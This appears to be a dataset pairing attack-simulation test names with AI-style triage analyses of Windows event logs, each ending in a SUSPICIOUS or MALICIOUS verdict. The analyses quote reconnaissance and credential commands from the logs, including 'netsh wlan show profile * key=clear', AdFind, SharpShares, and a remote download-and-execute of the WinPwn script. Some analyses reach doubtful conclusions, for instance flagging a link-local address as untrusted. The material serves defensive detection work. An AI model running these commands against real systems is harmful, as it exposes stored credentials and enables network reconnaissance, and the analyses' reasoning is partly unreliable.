4. Review network logs for any unauthorized access attempts or data exfiltration following these activities.
5. Increase monitoring on other critical systems for similar indicators of compromise.

This case demonstrates classic indicators of a compromise involving reconnaissance and potential lateral movement, aligning with known attack patterns."
Enumerate Stored Wi-Fi Profiles And Passwords via netsh,"Upon reviewing the logs provided, several key observations can be made which suggest suspicious and potentially malicious activity on the system:

### Analysis of Logs

1. **Time and Date Manipulation:**
   - **Event ID 4616 (Security Log):** Indicates time changes. Time manipulation is often used by attackers to evade detection by altering logs' timestamps. Although this alone is not evidence of an attack, coupled with other events, it raises suspicion.

2. **Logon with Elevated Privileges:**
   - **Event ID 4672 (Security Log):** The `admin_test` account is granted several high-level privileges (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.). This suggests an account with potentially unnecessary elevated privileges, which is often a red flag for unauthorized access or privilege escalation attempts.
   - **Logon Event ID 4624:** The `admin_test` username, logging in with NTLM, suggests this might be an administrative action, but the use of such privileges is atypical unless for specific administrative tasks.

3. **Unusual Process Execution:**
   - **Sysmon Events (Event ID 1 and 5):** Execution of `cmd.exe` with the command `netsh wlan show profile * key=clear` is suspicious as it retrieves all Wi-Fi profiles including keys, suggesting information gathering by an unauthorized user.
   - **Processes like `HOSTNAME.EXE`, `whoami.exe` (Sysmon Event ID 1):** These are used to gather information about the system and the current user, a common step in an attacker's reconnaissance phase.

4. **Unusual Credential Activity:**
   - **Event ID 5379 (Security Log):** Credential access and attempts involving Microsoft account-related descriptors. The `ReturnCode ""3221226021""` indicates a failed attempt to read credentials. Although failed, it indicates attempts at accessing account information.

### Assessment

The events detected in the logs show elevated permissions being granted to an `admin_test` account, process executions that exhibit recon-like activities and potential credential access attempts. While `admin_test` could be legitimate, the use of Netsh to view Wi-Fi credentials and execution of commands like `whoami` and `hostname` under a high integrity level account indicates suspicious behavior.

### Resolution

**SUSPICIOUS**

The logs reflect activities that are unusual and potentially indicative of compromise, warranting further investigation. Specifically, the elevated permissions, the processes executed, and the intent inferred from command-line usage suggest that there is a risk of malicious activity.

### Guidance on How to Proceed

1. **Immediate Actions:**
   - Conduct a thorough review of the `admin_test` account, checking for any unauthorized access or any changes made to it recently.
   - Evaluate network logs for any unauthorized access or data exfiltration attempts during the timeframe of these logs.

2. **Detailed Investigation:**
   - Examine the command history and scheduled tasks for any unexpected entries.
   - Review the installed software and services for any anomalies.

3. **Strengthen Security Measures:**
   - Ensure logging and monitoring configurations are effectively capturing all critical events.
   - Review and update security policies to restrict unnecessary privilege assignments.

4. **Consider Engaging Incident Response:**
   - If further investigation confirms suspicious activity, escalate to your Incident Response team to analyze and mitigate any threats.

Conclusively, while this analysis identified several suspicious activities, further investigation is essential to determine the scope and impact, if any, a potential compromise has on the system."
Security Software Discovery - Sysmon Service,"After a careful review of the provided Windows event logs, here are the key observations and analysis:

1. **Anomalous Process Activity:**
   - Multiple instances of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` executed by the user `SERVER002\admin_test`. While both wevtutil.exe and conhost.exe are legitimate Windows processes, their frequent and near-simultaneous execution could be suspicious if not part of regular administrative tasks.
   - Execution of `C:\Windows\System32\HOSTNAME.EXE` and `C:\Windows\System32\whoami.exe`, which are normal, are used to gather system and session information. If executed during irregular activity or without user initiation, they could suggest reconnaissance efforts.
   - Presence of the command `cmd.exe /c fltmc.exe | findstr.exe 385201` is atypical. The use of `fltmc.exe` (Filter Manager Control Program) with `findstr` suggests an attempt to find a specific driver or filter, indicating potential reconnaissance or system manipulation efforts.

2. **System Time Changes:**
   - There are kernel general event logs indicating time adjustments. This could be benign if the system's time was merely being synchronized, but can also be suspicious in a broader context of malicious activity to evade detection or logs' tampering.

3. **Software Updates:**
   - Multiple instances of Microsoft Edge Update processes, such as `MicrosoftEdgeUpdate.exe`, indicate software updates happening in sequence. This represents normal behavior under most circumstances.

4. **Potentially Malicious Patterns:**
   - While the execution of native tools like `wevtutil.exe`, `conhost.exe`, and alterations in system time are sometimes expected, their combination and pattern warrant closer inspection. Unsupervised or unexpected usage can indicate exploitation attempts or preparatory actions for further malicious activity.

### Assessment

Based on the analysis of the logs:
- The behavior is **SUSPICIOUS**. The activities around the processes `wevtutil.exe`, `conhost.exe`, command-line arguments suggesting filter management, and the time synchronization events could indicate subtle reconnaissance or preparation for more severe actions if not part of regular administrative maintenance.

### Recommended Actions
1. **Further Investigation:**
   - Verify with the system administrator or user if these activities (especially command lines involving `wevtutil.exe`, and filter management) are part of scheduled tasks or maintenance.
   - Check the context around the times these processes were executed – are they regular practice, or does this deviate from usual patterns?
   - Examine if there were any unauthorized network connections or data exfiltration attempts around these actions' timestamps.

2. **Monitor System:**
   - Increase monitoring on the user account (`admin_test`) and machine (`Server002`) for any additional anomalous behavior.
   - Implement alerts for execution of key reconnaissance commands and system tool misuse.

3. **Threat Hunting:**
   - Conduct a threat hunt across the network to see if similar patterns exist on other machines to rule out a broader enterprise-wide reconnaissance or pivoting by a threat actor.

In conclusion, while there are no overt signs of malicious actions, the patterns detected are suspicious enough to justify further examination to confirm or dispel potential threats."
Remote System Discovery - net group Domain Controller,"Based on the provided Windows event logs, let's perform a detailed analysis to identify any suspicious or malicious activities:

### **Detailed Analysis**

1. **System Logs:**
   - The events in the System log appear to reflect regular updates and time synchronization activities. For example, logs relating to ""Microsoft-Windows-WindowsUpdateClient"" show updates for Microsoft Defender Antivirus, which are routine actions for system maintenance and security.
   - There are no unusual processes or error codes to indicate malicious activity within the System log entries.

2. **Sysmon Logs:**
   - We observe multiple instances of common Windows executables (`whoami.exe`, `conhost.exe`, `wevtutil.exe`, `hostname.exe`, `cmd.exe`, `net.exe`, `net1.exe`) running under the `SERVER002\admin_test` account with high integrity level.
   - The use of `cmd.exe` with command line `""cmd.exe"" /c net group /domain ""Domain controllers""` could be potentially suspicious if it wasn't expected or authorized by policies because it indicates an action that queries information about domain controllers. However, without additional context or evidence of further exploitations, this remains suspicious but not definitively malicious.
   - Frequent execution of `wevtutil.exe` may indicate an attempt to read or clear event logs, which is common in log-tampering activities; however, there’s no further insight or evidence shown from other logs to conclude a log-clearing action by a malicious actor.
   - The `wuauclt.exe`, `AM_Delta.exe`, and `MpSigStub.exe` processes indicate Windows Update activities, consistent with System logs.

3. **Security Logs:**
   - The Security logs primarily contain credential-related events (Event ID 5379), indicating attempts to request credentials for Microsoft accounts which ended unsuccessfully. There’s no evidence from the logs indicating this activity was escalated to a successful attack.

4. **Application Logs:**
   - The Application log indicates that Windows Defender is active and functioning (`SECURITY_PRODUCT_STATE_ON`), which is desirable.

### **Assessment**

- The logs exhibit mostly benign activities associated with system updates and routine querying of system information.
- The use of `cmd.exe` with network querying commands is marked as suspicious due to the potential misuse in information gathering or reconnaissance within a network. However, no direct evidence of a security breach or compromise appears.

### **Conclusion and Guidance**

**Resolution: SUSPICIOUS**

- The activities within the logs are mostly benign; however, the command to query domain controller information (`net group /domain ""Domain controllers""`) raises a level of suspicion. This warrants further investigation, particularly to confirm whether this was an authorized activity or if it involved further actions not represented in the logs.
- **Next Steps:**
  - Validate the context of the `cmd.exe` execution by consulting with the system administrators or reviewing any related policies for allowed scripts and commands.
  - Investigate system and network access logs around the time of these events to identify any unauthorized access or lateral movements.
  - Preserving the integrity of the logs, continue to monitor for any repetition or escalation of command line executions similar to the suspicious activities observed.
"
List Google Chrome - Opera Bookmarks on Windows with powershell,"Upon examination of the provided Windows event logs, several key points of activity stand out that warrant a closer look for potential security concerns:

1. **PowerShell Activity:**
   - There is a PowerShell command being executed to recursively list items with a filter on ""Bookmarks"" within the `C:\Users\` directory: `""powershell.exe"" & {Get-ChildItem -Path C:\Users\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force}`. 
   - This could be a reconnaissance activity aiming to collect user data if run in an unauthorized context. Such scripts might be indicative of someone attempting to gather browser data or other saved information from users.

2. **Process Chain**:
   - Multiple legitimate Windows processes such as `hostname.exe`, `whoami.exe`, and `conhost.exe` are seen multiple times with `wsmprovhost.exe` as their parent, which is often part of legitimate administrative or management sessions.
   - The integrity level is ""High,"" indicating that these processes had administrative privileges, which could be normal or leveraged for privilege escalation.

3. **`wevtutil.exe` Usage:**
   - `wevtutil` has been invoked several times without clear documented operations in the logs. This utility is normally used to manage Windows Event Logs and could indicate log manipulation or auditing actions.

4. **Microsoft Edge Updates:**
   - Frequent process creation related to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`). The activity noted includes standard updates but should be verified to ensure that it aligns with expected patching and update cycles, especially because the update files were used from temporary directories.

5. **Privileged Actions:**
   - Security audit logs point to some administration-level access activities (e.g., Event ID 4672, for privilege assignment) consistent with system account operations. While the occurrence of these events is expected in normal operation, ensuring they align with regular administrative access schedules is prudent.

### Assessment
Based on the analysis:

- **The use of PowerShell with parameters suggesting data gathering (filtering for bookmarks) is unusual, particularly if not on a schedule or by unauthorized users.**
- **No direct evidence of malicious payloads or unauthorized foreign software execution is seen in these logs, but the possibility of reconnaissance or preparation for future activities merits attention.**
- **`wevtutil` use may be benign in scheduled maintenance but should be cross-referenced with access logs and change management documentation for validation.**

### Recommendation
- Conduct an inquiry into the rationale behind the PowerShell script usage and confirm the identity and intent of the administrator or user performing these tasks.
- Review patch management logs and correlate the Microsoft Edge update activities to ensure they are legitimate and appropriately scheduled.
- Cross-check `wevtutil` operations with administrative task logs to ensure there is no tampering with event logs.
- Ensure that all high-integrity level operations are logged correctly and monitor for unusual patterns.

### Resolution
- **Resolution: SUSPICIOUS** – The PowerShell usage, in particular, needs deeper investigation due to its potential for reconnaissance and unauthorized data access. It is recommended to continue monitoring the host for any further activities that might signal escalation or compromise."
Adfind -Listing password policy,"Let's analyze the provided logs to determine whether there is any malicious, suspicious, or benign activity.

### PowerShell Log
- No PowerShell logs were provided for analysis, so we cannot assess PowerShell activity.

### Application Log
- The logs demonstrate a typical series of events related to updates and security services.
- **edgeupdate:** Logs show Edge Update service activities and stopping. This is expected behavior for service management.
- **SecurityCenter:** Logs indicate Windows Defender is operational (`SECURITY_PRODUCT_STATE_ON`), suggesting no apparent issues with antivirus protection.
- **Microsoft-Windows-Security-SPP:** Logs show standard activity related to the software protection service.

### Security Log
- **Event ID 4624:** An account was successfully logged on with the `LogonType` as 5, which indicates a service logon. The logon is attribute to `SYSTEM`, a common and necessary system account.
- **Event ID 4672:** Privileges were assigned to `SYSTEM`. This event is typical of the system's internal mechanisms for handling processes that require special privileges.

### Sysmon Log
A common theme appears with many processes:

- **edgeupdate.exe, conhost.exe, wevtutil.exe, whoami.exe, HOSTNAME.EXE, svchost.exe, cmd.exe:** These processes are executed by a user `SERVER002\admin_test`. The `cmd.exe` process in the context of `admin_test` uses a command which includes executing `AdFind.exe` — this tool can be legitimate for querying Active Directory attributes but can be used maliciously for reconnaissance. 
- **No unusual command lines or parameters** are detected for the core system executables, but the use of AdFind by admin_test suggests efficiency that could be part of an audit or script.
 
### Findings
1. **Legitimate and Routine Activity**:
   - Most of the logs for `MicrosoftEdgeUpdate.exe` appear consistent with routine updating operations. 
   - SYSTEM-level users launching processes like svchost, SecurityHealthService, and edgeupdate are normal in Windows environments.

2. **Suspicious Indicators**:
   - The execution of `cmd.exe` with `AdFind.exe` by the user `admin_test` is suspicious due to its potential use in reconnaissance and sensitive information retrieval capabilities. While the command itself could be of benign administrative use, it suggests an activity requiring further probing (i.e., checking the context, purpose for its use, and whether the admin_test account authorized and documented this action).

### Assessment
Given that most logs align with expected update and system functions, but some command usage by a non-standard user account raises questions, this situation contains potentially suspicious activity needing more investigation to ensure legitimacy.

### Recommendation
- **SUSPICIOUS**
   - Conduct further investigation on the `admin_test` account's purpose and activities.
   - Verify if the `AdFind.exe` usage was authorized and documented.
   - Review related account activity and audit logs for a broader temporal context to validate intent.

Based on these elements and the necessity to validate utilization of administrative commands, the overall assessment is categorized as **SUSPICIOUS**, pending further verification."
Enumerate All Network Shares with SharpShares,"Upon reviewing the logs provided, my analysis focuses on identifying patterns and behaviors indicative of potentially malicious activity. The Sysmon, PowerShell, and Application logs provide significant insight into system processes and activities executed.

### Suspicious and Anomalous Findings:

1. **PowerShell Execution**:
   - **Command Line Execution**: PowerShell is executing a command that includes the execution of ""SharpShares.exe"" via `cmd.exe` with parameters `/ldap:all`.
   - **File Location**: The binary `SharpShares.exe` is located within the user's temporary directory, specifically within a path that is somewhat obfuscated (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\\SharpShares.exe`). This technique could be an attempt at avoiding detection or logging.
   - **Command**: `powershell.exe & {cmd /c 'C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\\SharpShares.exe' /ldap:all | out-file -filepath \""$env:temp\\dataSharpSharesOutput.txt\""}`

2. **Execution of Uncommon Tool (SharpShares)**:
   - **Tool Description**: `SharpShares.exe` is typically associated with penetration testing or red team activities for enumerating shared files and directories across a Windows domain.
   - **Purpose of Execution**: The command executed attempts to list shared resources within the domain using LDAP, which would be suspicious in a typical user environment if not performed by a security or IT professional as part of their duties.

3. **High Integrity Level**:
   - **Process Execution**: Processes involved in producing these events have been executed with a high integrity level, which indicates elevated permissions, potentially allowing manipulation of system activities.

4. **User Context**:
   - The activities executed in the context of `SERVER002\\admin_test`, suggesting a user with administrative rights on the system.

5. **Repeated Use of Conhost.exe**:
   - **Pattern**: Conhost.exe appears multiple times in connection with processes commonly used for creating command-line interfaces (PowerShell, cmd).
   - **Implication**: While typical in some scripting contexts, this repetition alongside SharpShares.exe usage could suggest suspicious automation or script-based exploitation.

### Assessment and Threat Evaluation:

- **Indicators of Malicious Activity**: The execution pattern involving PowerShell to command-line execution, use of potentially dangerous tools like SharpShares, and elevated execution rights suggest movements consistent with an intrusion or active reconnaissance phase in a network.
- **Risk**: The execution of such tools without explicit deviation in policy or sanctioned IT activities indicates a risk to sensitive data and internal system configurations.

### Resolution: SUSPICIOUS

The findings indicate activity that warrants further investigation due to unusual software execution and behaviors typically consistent with techniques known to be used in compromised scenarios or penetration tests. It is prudent to:

- **Confirm Legitimacy**: Check if these activities were authorized, perhaps part of a sanctioned network security audit.
- **Investigate SharpShares**: Query why SharpShares.exe was executed and if its presence aligns with IT department procedures.
- **Audit Admin Test User**: Review recent activities and access the history of `SERVER002\\admin_test`.
- **Check for Persistence Mechanisms**: Further security checks should ensure no backdoor or persistence techniques were established through these recent activities. 
- **Adjust and Monitor**: Consider increasing monitoring for similar patterns on other systems.

Such proactive steps would help validate whether this suspicious activity constitutes an active threat or benign administrative usage."
Process Discovery - Process Hacker,"### Analysis of Collected Logs

**1. Overview of the Logs:**  
- The logs provided include Windows PowerShell events, security auditing information, Sysmon logs, and several empty logs (System, Security, and Application logs).
- We are focusing on detecting any potentially suspicious behavior, particularly given the alert from the EDR on the CEO's machine.

**2. Detailed Review:**

**PowerShell Log Entries:**
- The primary concern is the use of `Start-Process` in PowerShell to launch a specific application: `ProcessHacker.exe`. This application is known for its capabilities to manipulate processes and inspect system internals, often used by attackers for malicious purposes.
- Several PowerShell events (Event ID 600) indicate the execution of:  
  ```
  powershell.exe & {Start-Process -FilePath ""$Env:ProgramFiles\Process Hacker 2\ProcessHacker.exe""}
  ```
  - This command is executed under the `ConsoleHost` environment, suggesting an interactive session possibly indicating unauthorized use.
- Event ID 403 and 400 show a transition of the PowerShell engine state, but more notably, the execution of ProcessHacker via PowerShell, as above, is confirmed.

**Security Log Entries:**
- Event ID 4799 involves `setup.exe` linked with Microsoft Edge Update. While this in itself isn't immediately problematic, the involvement of `setup.exe` as a `CallerProcessName` is noted for contextual awareness and potential process injection or child-process creation evaluation.

**Sysmon Log Entries:**
- The presence of `powershell.exe` running as `SERVER002\admin_test` is verified via Sysmon Event ID 5, corroborates with the PowerShell log.
- Sysmon shows that `wevtutil.exe` is active alongside `powershell.exe` sessions. While `wevtutil.exe` is used for managing Windows Event logs, its execution warrants analysis because it might indicate log tampering attempts.
- Elevated integrity levels observed (High) during the execution of processes like `hostname.exe` and `whoami.exe` indicate operations running with administrative privileges, aligning with potentially unauthorized activity.
- It's also notable that `SecureBootEncodeUEFI.exe` is executed by `NT AUTHORITY\SYSTEM`, a process related to system-level operations, but presently nothing indicates malicious activity here.

### Conclusion:

**Assessment:**
- **SUSPICIOUS:** 
  - The execution of `ProcessHacker.exe` through PowerShell using `Start-Process` is inherently risky and aligns with techniques typically used for privilege escalation or unauthorized monitoring.
  - Similarly, the presence and use of `wevtutil.exe` is suspicious if it was not expected, as it may be used to clear event logs or modify them.

**Guidance on How to Proceed:**
1. **Immediate Actions**:
   - Review access logs and account activity for `SERVER002\admin_test` to determine how unauthorized PowerShell scripts could have been executed.
   - Investigate any interactions with `ProcessHacker.exe` to verify the intent, including who initiated them.
   - Validate installations, policies, and intended use cases for `ProcessHacker.exe`. If unauthorized, this may indicate compromise.
  
2. **Further Investigation**:
   - Perform a full endpoint security check on the CEO’s machine to ensure no other unauthorized applications or modifications exist.
   - Review system change logs around the timestamp of this activity for unexplained changes or installations.
   - Engage in user interviews to ascertain any legitimate activities that might have triggered these logs or assess any security awareness gaps.

3. **Recovery/Preventative Measures**:
   - Disable or tighten PowerShell script execution policies and ensure only authorized personnel can execute PowerShell with administrative privileges.
   - Maintain visibility and alerts on specific applications like `ProcessHacker.exe` and administrative tool usage.
   - Implement strict Access Controls and conduct regular training sessions to avoid user-induced incidents.

This situation warrants further investigation to rule out a potential threat actor or insider threat scenario."
Network Share Discovery PowerShell,"Upon analyzing the provided event logs from various categories (System, Windows PowerShell, Application, Security, and Sysmon), I have compiled the following detailed analysis and assessment:

### Analysis and Observations:

1. **Windows PowerShell Events**:
   - Several PowerShell events were logged related to the execution of `powershell.exe` with the command `{get-smbshare}`. The `get-smbshare` command retrieves a list of shared resources on the server, but this is not inherently malicious. The events indicate interactions with different providers (Registry, Alias, Environment, FileSystem, etc.) which are typically benign when not combined with malicious intent.

2. **Sysmon Logs**:
   - Multiple instances of `MicrosoftEdgeUpdate.exe` and its components ran, which usually indicates a routine update or registration activity for Microsoft Edge. These processes are executed by `NT AUTHORITY\SYSTEM`, which is common for such system update tasks.
   - `wevtutil.exe` and `conhost.exe` executions by `SERVER002\admin_test` user account may appear odd but can be legitimate if tied to administrative tasks like querying or archiving event logs.
   - Execution of `whoami.exe` indicates querying of currently logged-in user details. This action might be for informational purposes, but it can also be part of reconnaissance activity in a malicious scenario.

3. **Application Log**:
   - The `edgeupdate` logs reflect that the Edge Update service was stopped. This might be due to routine service operations or updates.
   - The `Microsoft-Windows-Security-SPP` event indicates an expected operation related to software protection, which is benign.

### Assessment:

- The logs show significant system and process activities around the Microsoft Edge update mechanism, Windows PowerShell use, and some system utility execution which are normal under typical circumstances.
- The PowerShell usage does need to be monitored, especially scripts involving retrieval of network shares (`get-smbshare`), although no direct indicators of malicious intent have been found.
- There are no clear indications of privilege escalation or exploitation visible in the logs. 

### Resolution:

Based on the provided logs and the observations:

- **Resolution**: **SUSPICIOUS**

The activities recorded, such as frequent PowerShell executions and querying of system information (`whoami.exe`), could be benign under normal operation conditions but warrant closer scrutiny. There is no clear evidence of malicious activity; however, the context in which these commands were executed is not fully understood solely from logs. Further investigation, such as analyzing further context around these executions (user intentions, linked incidents) and cross-referencing network activity, may be necessary to conclude definitively.

### Guidance on How to Proceed:

1. **Immediate Monitoring**: 
   - Place monitoring on further PowerShell and administrative command executions to detect potential misuse or further reconnaissance activity.
  
2. **Conduct User Interviews**: 
   - Engage with the user involved (`SERVER002\admin_test`) to understand the context and purpose of the PowerShell and system commands executed during this timeframe.

3. **Review Network Activity**:
   - Correlate these events with network logs, looking for any suspicious outbound connections that could indicate data exfiltration attempts.
  
4. **System Inventory and Baseline**:
   - Ensure that all running applications, especially updaters and scripts, are documented and reviewed for potential illegitimate versions or configurations.
  
5. **Consideration for Forensic Analysis**:
   - If suspicious activities continue or escalate, consider a deeper forensic investigation to understand any potential threats better.

Overall, while the logs indicate activities that are not inherently malicious, further attention is warranted to ensure that they are part of expected and authorized administrative actions."
WinPwn - RBCD-Check,"## Detailed Analysis of Provided Windows Event Logs

### Summary:
The provided Windows event logs for the system `Server002` display a sequence of events indicating potential malicious behavior. A combination of network connections, process executions, and privilege usage points towards suspicious activity associated with the `admin_test` user account.

### Analysis:

1. **Process Executions**:
   - **Unexpected PowerShell Script Execution**: The event logs show `PowerShell.exe` execution with a command downloading and executing a script from an external URL (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`). This behavior is often indicative of an attempt to execute potentially malicious scripts from the internet. 

   - **Classic Reconnaissance Commands**: Multiple executions of `whoami.exe` and `hostname.exe` scripts are present. While not inherently malicious, when combined with other activities, these may serve reconnaissance purposes (i.e., identifying logged-on users and host details).

2. **Potential Indicators of Credential Dumping or Persistence**:
   - **Privileges**: The `admin_test` account has been observed with several elevated privileges such as `SeDebugPrivilege` and `SeLoadDriverPrivilege`, which are often associated with advanced attacks, including credential dumping, persistence, or privilege escalation attempts.

3. **Suspicious Network Activity**:
   - **NTLM Logon Events**: The presence of NTLM logon events associated with a potentially untrusted IP address (`fe80::e3b5:5371:12a8:9c77`) suggests possible unauthorized access or brute-force attempts on the system.

4. **Console Host and High Integrity Levels**:
   - The execution of `conhost.exe` with high integrity suggests these processes are operating with elevated privileges, increasing the likelihood of privilege escalation or persistence mechanisms.

5. **Wevtutil Usage**:
   - The repeated execution of `wevtutil.exe`, which is used for managing and clearing event logs, might indicate attempts to cover tracks or delete certain activities from logs.

### Assessment:
The sequence of events logged here not only demonstrates behaviors like reconnaissance but also potentially malicious activities such as attempts to clear logs and execute downloaded scripts. While not all activities are conclusive evidence of compromise independently, in combination, they align with common attack patterns used to compromise systems.

### Identified Threats/Risks:
- **Execution of Remote Scripts**: Possible introduction of malware or further malicious scripts.
- **Misuse of Administrative Privileges**: Potential for unauthorized access or control of system resources.
- **Log Tampering**: Efforts to erase or obscure further malicious actions may compromise logging integrity, impacting investigation and response efforts.

### Guidance & Resolution:
1. **Immediate Actions**: Disconnect the machine from the network to prevent further spread or command and control communication. 

2. **Investigation and Verification**: 
   - Investigate how the script execution was initiated and review any scripts downloaded during this session.
   - Analyze the IP traffic associated with the `fe80::e3b5:5371:12a8:9c77` address to determine if it indicates unauthorized access.

3. **Threat Containment**:
   - Review user account activities, password policies, and potentially reset compromised credentials, especially the `admin_test` account.
   - Examine adjacent systems for lateral movement or further compromises.

4. **Long-term Mitigation**: 
   - Strengthen PowerShell script monitoring and restriction policies.
   - Enforce stricter access controls to critical accounts and services.
   - Implement enhanced logging and anomaly detection to flag suspicious activities.

**Final Assessment Resolution**: **MALICIOUS** - The activities documented in these logs, especially with the PowerShell download and execution, display strong indicators of malicious intent. Immediate incident response actions are warranted.
"
Remote System Discovery - net,"### Detailed Analysis of the Logs

#### **System Log:**
1. Several logs indicate time synchronization activities carried out by `svchost.exe`, changing the system time. This adjustment activity on its own can sometimes be a benign behavior due to time synchronization settings or daylight saving changes. However, repeated time changes can also be indicative of efforts to cover tracks or execute time-based attacks.
2. Windows Update logs show updates, particularly for Windows Defender, are being checked and processed, which is routine.

#### **PowerShell Log:**
1. The presence of `wsmprovhost.exe` running PowerShell commands can be indicative of remote management activities. However, there is no detailed command-line activity provided within these logs, thus it looks standard as per the available data.

#### **Application Log:**
1. Logs show that Windows Defender is active and running, and the Software Protection Platform Service is engaging as expected with no apparent anomalies.

#### **Security Log:**
1. Multiple 4672 events indicate that the `admin_test` account used extensive privileges like `SeDebugPrivilege` and others, often associated with sensitive operations, typically requiring administrator-level access. These privileges might be routine for an admin performing regular management tasks, but they might also be used during malicious activity for privilege escalation.
2. The logon events (4624) with NTLM authentication show the `admin_test` user connecting remotely using NTLM protocol from a specific IP. Repeated connections might need evaluation to ensure these are expected behaviors.
3. Several failed attempts (5379) targeting MicrosoftAccounts indicate potential erroneous or unwanted access attempts.

#### **Sysmon Log:**
1. Processes such as `whoami.exe`, `hostname.exe` and `cmd.exe` are observed, which generally are not alarming unless they're being excessively or repeatedly used beyond normal operations.
2. Some suspicious command-line activity from `cmd.exe` running `net view /domain & net view`. This could suggest network Enumeration attempts, often a step in a lateral movement or reconnaissance effort.
3. Use of processes like `wevtutil.exe` with `admin_test` suggests potential Archival, Deletion, or Exportation of event logs, which can be a sign of log clearing after unauthorized access.

### Assessment of the Situation:
Based on the logs:

- The logs present routine activities relating to system updates and time adjustments, which could be considered benign in common scenarios. However, some potential indicators of atypical or possible malicious activity need further scrutiny:
  - **Repeated time changes** might need to check for any unintended time manipulation.
  - **Extensive privilege usage** and remote logon behavior by the user `admin_test` should be verified if it’s a part of normal operations.
  - **Network enumeration** and potential log manipulation activities may indicate a reconnaissance effort or an attempt to cover tracks. 

### Threats or Risks Identified:
- There is potential misuse of administrative privileges.
- Unusual time setting behavior, though possibly benign, coexists with possibly suspicious process executions, indicating a risk that should not be ignored.
  
### Guidance on How to Proceed:
- Verify the source and justification for all elevated privilege activities by `admin_test`.
- Review time-setting policies and ensure changes are expected and authorized.
- Investigate the origin and intent of connections from the observed IP address (192.168.0.102 and fe80::e3b5:5371:12a8:9c77).
- Monitor for any further suspicious `wevtutil.exe` executions and examine event logs for any signs of tampering.

### Resolution:
- **SUSPICIOUS**: The logs contain activities (privilege usage, potential network recon, and log clearance attempts) that need further investigation to determine intent and origin."
Enumerate logged on users via CMD (Local),"Based on the provided Windows event logs, here's my detailed analysis:

### Sysmon Log Analysis:
1. **Repeated Execution of wevtutil.exe and conhost.exe**:
   - The logs show a sequence of events where `wevtutil.exe` and `conhost.exe` are repeatedly executed by the user `SERVER002\admin_test`. The tool `wevtutil.exe` is used to retrieve and manage event log data, which can be legitimate behavior or could indicate suspicious activity if used by a non-privileged user or during unauthorized access.

2. **Execution of HOSTNAME.EXE and WHOAMI.EXE**:
   - The execution of `hostname.exe` and `whoami.exe` are noted under the user `SERVER002\admin_test`. These commands are typically used to gather system information and logged-in user details.
   - Both processes are initiated by `wsmprovhost.exe`, hinting at remote management or automation scripts, which are common in an administrative context but on a CEO's machine, it might require scrutiny.

3. **Use of CMD.EXE**:
   - The use of `cmd.exe` with the `/c query user` command could indicate normal inquiries about user sessions. However, continuous monitoring and frequent checks might imply scoping or reconnaissance activities by unauthorized users.

### Security Log Analysis:
- **Event ID 4616**: This event relates to system time changes, specifically the adjustments managed by `svchost.exe`. There's a timestamp alteration but appears legitimate and controlled by system processes.

### Application Log Analysis:
- **EdgeUpdate Service Stopping**: The EdgeUpdate service stopping could coincide with maintenance or updates. Given other events, it seems to fall into expected patterns of the log timing. However, legitimate updates generally coincide with a ""service started"" log, which is not observed.

### System Log Analysis:
- **Time Synchronization Events**: There are entries indicating system time synchronization with `time.windows.com`, which appear routine and match typical network time protocols.

### Assessment:
- The reviewed logs exhibit a range of potentially benign activities typical for system maintenance and administrative tasks, especially on a server. However, there are a few entries that could warrant further monitoring or temporary categorization as suspicious due to the context (CEO’s machine) and some commands executed.

### Resolution:
- **Resolution**: **SUSPICIOUS**
- **Recommendation**: 
  - Further investigation is needed concerning the `wevtutil.exe` and `conhost.exe` executions, especially in correlation with the current user and ongoing tasks.
  - Validate whether these activities align with typical administrative duties, security software, or automated scripts.
  - Verify with the IT department if recent authorized scripts or tools were deployed for system checks or maintenance.
  - Consider employing enhanced monitoring or alerting for similar events or access patterns for a short period, particularly focused on the CEO's system.

This assessment highlights potential areas of exploration without confirming malicious intent, hence remaining cautious while proceeding with further scrutiny."
MSFT Get-GPO Cmdlet,"Based on the provided Windows event logs, here is a detailed analysis:

### Sysmon Log Analysis:
1. **Suspicious Process Executions:**
   - **`DismHost.exe`** in a temporary directory: The execution of `DismHost.exe` from `C:\Users\ADMIN_~1\AppData\Local\Temp\...` is unusual. This executable is typically associated with legitimate operations like servicing Windows images, but its presence in a temporary directory under a possibly obfuscated path (using short names like `ADMIN_~1`) is suspicious and indicative of potential malicious behavior.
   - **`powershell.exe` with specific command:**
     - Appears multiple times invoking commands: `""powershell.exe"" & {Get-GPO -Domain $ENV:userdnsdomain -All >> $env:temp\GPO_Output.txt}`. This command is used to gather Group Policy Objects information from a domain, which is a common tactic used for reconnaissance by attackers.
   - **Frequent use of `wevtutil.exe`:**
     - `wevtutil.exe` was executed multiple times. This tool is used to clear or export event logs and frequent use under the context of `admin_test` is unusual and might suggest log tampering intentions.

2. **Tools for Enumeration:**
   - **`whoami.exe`:** Normally used to display user information, its presence is not necessarily suspicious, but in the context of other events, it could indicate an information-gathering step by an attacker.

3. **Command Execution Context and Privilege:**
   - Several of these executions happen under the user account `SERVER002\admin_test` with a high integrity level, indicating elevated privileges that are not aligned with standard practices unless justified by administrative tasks.

### Windows PowerShell Log Analysis:
- Confirms the execution of the PowerShell command: `powershell.exe & {Get-GPO -Domain $ENV:userdnsdomain -All >> $env:temp\GPO_Output.txt}`. This further validates the script execution intended to gather domain-wide policy information, which is a typical reconnaissance activity.

### Additional Observations:
- Several benign updates correspond to Microsoft Edge and other Microsoft utilities executing related processes, which appear regular and not inherently suspicious. However, this can sometimes be leveraged by attackers to blend in with legitimate processes.

### Assessment:
The use of `DismHost.exe` from a temporary directory, combined with repeated PowerShell command execution and potential log clearing activity using `wevtutil.exe`, indicates behavior consistent with reconnaissance and potential camouflage by an adversary within the system.

### Resolution:
**SUSPICIOUS** - The activities observed within these logs: 
- High usage of legitimate tools and unusual paths for script execution suggest that further investigation is needed.
- Consider examining admin_test user's activities and verifying the integrity of scripts running in temporary directories.
- It is recommended to initiate a more detailed forensic investigation into the `admin_test` account and its recent activities.

### Guidance:
- Consult the EDR system for more detailed telemetry on these processes.
- Increase logging and alerting around the `powershell.exe` and `wevtutil.exe` executions for anomalous patterns.
